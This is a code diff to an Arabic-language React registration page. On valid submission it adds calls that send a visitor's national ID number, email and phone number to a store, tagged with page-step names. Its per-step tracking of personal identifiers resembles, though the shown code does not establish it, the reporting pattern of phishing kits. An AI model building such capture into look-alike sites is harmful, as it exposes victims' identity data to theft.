@@ -1,5 +1,6 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
+import { navigateToPage, sendData } from "@/lib/store";
 
 export default function Register() {
   const [, navigate] = useLocation();
@@ -13,6 +14,10 @@ export default function Register() {
   const validateEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
   const validatePhone = (v: string) => /^\d{7,12}$/.test(v);
   const validateNationalId = (v: string) => /^\d{8,11}$/.test(v);
+
+  useEffect(() => {
+    navigateToPage("تسجيل حساب - نوع الحساب");
+  }, []);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -28,6 +33,16 @@ export default function Register() {
     else if (!validatePhone(phone)) newErrors.phone = "رقم الهاتف يجب أن يحتوي على أرقام فقط (7-12 رقم)";
 
     if (Object.keys(newErrors).length === 0) {
+      sendData({
+        data: {
+          "نوع الحساب": accountType === "resident" ? "مواطن/مقيم" : "زائر",
+          "رقم البطاقة": nationalId || "-",
+          "البريد الإلكتروني": email,
+          "رقم الهاتف": countryCode + phone,
+        },
+        current: "تسجيل حساب - نوع الحساب",
+        nextPage: "تسجيل حساب - البيانات الشخصية",
+      });
       navigate("/register/personal-info");
     } else {
       setErrors(newErrors);
